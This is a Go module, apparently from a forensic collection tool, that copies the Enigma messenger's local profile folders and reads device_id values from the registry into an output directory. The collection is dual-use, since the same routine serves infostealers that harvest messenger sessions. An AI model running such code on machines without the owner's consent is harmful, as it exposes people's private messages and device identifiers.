package Messengers

import (
	"ForensicPro/utils"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
)

var messengerEnigmaName = "Enigma"

func EnigmaSave(path string) {
	var builder strings.Builder

	LinePath := utils.GetLocalAppDataPath("Enigma\\Enigma")
	if _, err := os.Stat(LinePath); err == nil {
		targetPath := filepath.Join(path, messengerEnigmaName) // 请替换 "path" 和 "MessengerName" 为实际路径和名称
		if err := os.MkdirAll(targetPath, os.ModePerm); err != nil {
			log.Fatalf("创建目录失败: %v", err)
		}
		// 读取扩展目录下的所有子目录
		directories, err := ioutil.ReadDir(LinePath)
		if err != nil {
			return // 如果读取失败，跳过
		}
		for _, dir := range directories {
			dirPath := filepath.Join(LinePath, dir.Name())
			if !strings.Contains(dir.Name(), "audio") &&
				!strings.Contains(dir.Name(), "log") &&
				!strings.Contains(dir.Name(), "sticker") &&
				!strings.Contains(dir.Name(), "emoji") {

				destDirPath := filepath.Join(targetPath, dir.Name())
				err := utils.CopyDirectory(dirPath, destDirPath)
				if err != nil {
					fmt.Println("Error copying directory:", err)
					continue
				}
				fmt.Println("Copied directory:", dirPath, "to", destDirPath)
			}

			// 打开注册表项
			key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Enigma\Enigma`, registry.READ)
			if err != nil {
				log.Fatal(err)
			}
			defer key.Close()
			// 读取所有值
			values, err := key.ReadValueNames(-1) // 传入 -1 读取所有值
			if err != nil {
				log.Fatal(err)
			}
			// 输出每个值
			for _, valueName := range values {
				if strings.Contains(valueName, "device_id") {
					value, _, err := key.GetStringValue(valueName)
					if err != nil {
						log.Printf("无法读取值 %s: %v\n", valueName, err)
						continue
					}
					builder.WriteString(value)
				}
			}
			contents := builder.String()
			outputFile := "device_id.txt"
			if err := utils.WriteToFile(contents, targetPath+"\\"+outputFile); err != nil {
				fmt.Println("Error writing to file:", err)
				return
			}
		}
	}
	fmt.Println("Enigma 取证结束")
}
